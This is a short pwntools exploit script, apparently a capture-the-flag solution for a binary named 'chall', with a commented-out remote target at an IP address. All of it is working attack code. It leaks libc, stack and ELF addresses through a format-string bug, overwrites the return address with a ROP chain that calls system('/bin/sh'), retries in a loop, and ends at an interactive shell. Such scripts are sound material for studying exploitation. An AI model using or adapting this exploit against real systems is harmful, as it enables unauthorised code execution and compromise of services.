from pwn import *

context.binary = exe = ELF('./chall')
libc = ELF('./libc.so.6')

while(1):
    exe.address = libc.address = 0
    io = process()
    #gdb.attach(io, api=True)
    #io = remote('45.153.243.57', 13337)

    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'text: ')
    payload = b'%45$p-%49$p-%47$p-'
    payload = payload + b'i'*(256-len(payload)) + b'\x20\x40'
    io.send(payload)

    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'> ')
    io.sendline(b'4')

    try:
        io.recvuntil(b'0x')
        libc.address = int(io.recvuntil(b'-0x')[:-3], 16) - 0x29d90
        log.info(f'Libc base: {hex(libc.address)}')
        ret_addr = int(io.recvuntil(b'-0x')[:-3], 16) - 0x110
        log.info(f'Return address: {hex(ret_addr)}')
        exe.address = int(io.recvuntil(b'-ii')[:-3], 16) - exe.sym['main']
        log.info(f'ELF base: {hex(exe.address)}')

        pop_rdi = libc.address + 0x2a3e5
        bin_sh = libc.address + 0x1d8698

        io.recvuntil(b'> ')
        io.sendline(b'1')
        io.recvuntil(b'text: ')
        payload = fmtstr_payload(10, {ret_addr:pop_rdi, ret_addr+8:bin_sh})
        payload = payload + b'i'*(256-len(payload)) + b'\x20\x40'
        io.send(payload)

        io.recvuntil(b'> ')
        io.sendline(b'2')
        io.recvuntil(b'> ')
        io.sendline(b'4')

        io.recvuntil(b'> ')
        io.sendline(b'1')
        io.recvuntil(b'text: ')
        payload = fmtstr_payload(10, {ret_addr+16:pop_rdi+1,ret_addr+24:libc.sym['system']})
        payload = payload + b'i'*(256-len(payload)) + b'\x20\x40'
        io.send(payload)

        io.recvuntil(b'> ')
        io.sendline(b'2')
        io.recvuntil(b'> ')
        io.sendline(b'4')

        io.recvuntil(b'> ')
        io.sendline(b'3')

        io.interactive()

    except:
        io.close()
        continue